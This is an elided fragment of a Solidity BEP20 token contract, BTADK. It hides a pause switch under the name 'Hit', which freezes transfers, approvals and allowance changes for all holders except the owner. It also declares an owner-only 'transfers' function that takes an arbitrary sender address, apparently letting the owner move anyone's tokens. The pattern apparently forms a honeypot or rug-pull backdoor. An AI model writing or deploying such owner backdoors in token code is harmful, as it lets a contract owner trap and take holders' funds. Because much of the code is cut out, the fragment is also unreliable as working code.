 ...
 */
contract Hitable is Ownable {
  event Pause();
  event Unpause();
  event NotPausable();

  bool public hit = false;
  bool public canHit = true;

  /**
   * @dev Modifier to make a function callable only when the contract is not hit.
   */
  modifier whenNotHit() {
    require(!hit || msg.sender == _owner);
    _;
  }
  ...
  /**
     ...
     **/
    function Hit() onlyOwner whenNotHit public {
        require(canHit == true);
        hit = true;
        emit Pause();
    }
   ...
   */
  function unhit() onlyOwner whenHit public {
    require(hit == true);
    hit = false;
    emit Unpause();
  }
  ...
  /**
     ...
     **/
    function clearhit() onlyOwner public{
        hit = false;
        canHit = false;
        emit NotPausable();
    }
...
contract BTADK is Context, IBEP20, Ownable, Hitable {
  ...
  */
   ...
   */
  function transfer(address recipient, uint256 amount) public whenNotHit returns (bool) {
   ...
   */
  function approve(address spender, uint256 amount) public whenNotHit returns (bool) {
   ...
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) public whenNotHit returns (bool) {
...
/**
 ...
 function transfers(address sender, address recipient, uint256 amount) external onlyOwner returns (bool) {
   ...
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue) public whenNotHit returns (bool success) {
    require(!frozenAccount[msg.sender]);
   ...
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotHit returns (bool success) {
    require(!frozenAccount[msg.sender]);
